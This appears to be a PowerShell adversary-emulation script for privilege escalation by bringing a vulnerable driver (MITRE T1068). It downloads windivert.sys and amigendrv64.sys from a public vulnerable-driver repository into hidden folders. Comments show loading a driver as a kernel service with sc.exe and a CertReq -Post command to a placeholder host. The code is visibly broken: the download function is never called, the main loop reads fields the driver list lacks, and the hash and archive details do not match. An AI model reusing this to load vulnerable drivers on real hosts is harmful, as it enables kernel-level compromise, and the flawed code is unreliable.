# Bring Your Own Vulnerable Driver
# Technic ID : T1068
Clear-Host
Write-Output "==============================================================================="
Write-Output " Exploitation for Privilege Exploitation (T1068)"
Write-Output " Driver : Windivert.sys"
Write-Output "==============================================================================="
################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$StoragePath = "$env:PUBLIC\Toolz";
$LogFile = "$env:PUBLIC\exf\Vuln_Drivers_windivert.txt";
$DownloadUrl = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/"

$VulnDriversArray = @(
    [PSCustomObject]@{
        UID ="89ed5be7ea83c01d0de33d3519944aa5";
        DrvName = "windivert.sys"
    },
        [PSCustomObject]@{
        UID ="32365e3e64d28cc94756ac9a09b67f06";
        DrvName = "amigendrv64.sys"
    }
)
################ [ FUNCTIONS ] ################

# Function to Download files
function DownloadFiles {

# CertReq -Post -config https://www.example.org/file.ext C:\Windows\Temp\file.ext file.txt
# sc.exe create amigendrv64.sys binPath=C:\windows\temp\amigendrv64.sys type=kernel && sc.exe start amigendrv64.sys
    param(
#        [Parameter(Mandatory = $true)]
        [string]$DownloadFrom=$DownloadUrl,
        [Parameter(Mandatory = $true)]
        [string]$DonwnloadedFileName,
        [Parameter(Mandatory = $true)]
        [string]$StorageFileName,
        [Parameter(Mandatory = $true)]
        [string]$StorageDirectory
        )

$ArchiveFile = "PSTools.zip"
$DestinationDirectory = "$env:PUBLIC\PSTools"
$Full_Destination = "$env:PUBLIC\Toolz\$StorageFileName"


$CompleteCommand = "Invoke-WebRequest -Uri " + "$DownloadFrom" + " -outfile " + "$Full_Destination";
try {
    
    Invoke-Expression  "$CompleteCommand";
    Write-Output "Successfully downloaded [$ArchiveFile] to $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
    New-Item -ItemType "directory" $DestinationDirectory -Force;
    $psdir = Get-Item "$DestinationDirectory" -Force;
    $psdir.attributes = "hidden";

    if ([System.IO.File]::Exists("$Full_Destination")) {
        Add-Type -Assembly 'System.IO.Compression.FileSystem';
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$Full_Destination", "$DestinationDirectory");
        Write-Output "The file [$ArchiveFile] has been extracted to  $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding ascii -Append;
        Get-ChildItem -Path $DestinationDirectory | Out-File -FilePath $LogFile -Encoding ascii -Append
        exit 0;
    } 
    else {
        Write-Output "The file [$ArchiveFile] does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
        exit 2;
    };

}
catch {
    Write-Output "Error : $($_.Exception.Message)" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
    exit 1;   
}

}

################ [ MAIN BODY ] ################
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Force
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append

# Loop to manage each entry in the array.

foreach ($ligne in $VulnDriversArray) {
    $source = $ligne."01"
    $destination = $ligne."02"
    $shaAttendue = $ligne."03"

    # Vérifie que le fichier source existe
    if (Test-Path $source) {
        try {
            # Renomme le fichier
            Rename-Item -Path $source -NewName $destination -Force -ErrorAction Stop

            # Calcule la somme SHA256 du fichier renommé
            $shaCalculee = (Get-FileHash -Path $destination -Algorithm SHA256).Hash

            # Compare les sommes
            if ($shaCalculee -eq $shaAttendue) {
                Write-Host "[OK] $destination : somme SHA256 correcte."
            } else {
                Write-Host "[ERREUR] $destination : somme SHA256 incorrecte."
                Write-Host "  Attendu : $shaAttendue"
                Write-Host "  Calculé : $shaCalculee"
            }
        }
        catch {
            Write-Host "[ERREUR] Impossible de renommer $source vers $destination : $_"
        }
    } else {
        Write-Host "[ERREUR] Le fichier source $source n'existe pas."
    }
}

